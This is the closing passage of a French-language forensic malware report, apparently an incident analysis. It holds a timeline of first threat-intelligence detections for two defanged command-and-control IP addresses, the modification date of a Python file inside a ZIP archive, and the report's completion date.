| 2026-02-04 | Premieres detections OTX pour 178[.]16[.]53[.]173 (C2 #2) |
| 2026-02-10 | Premieres detections OTX pour 158[.]94[.]210[.]160 (C2 #1) |
| 2026-02-13 | Modification JeffreyEpstein.py (timestamp dans le ZIP) |
| 2026-02-13 | Analyse forensic (ce rapport) |

---

*Fin du rapport*
*Rédigé le 13 fevrier 2026*
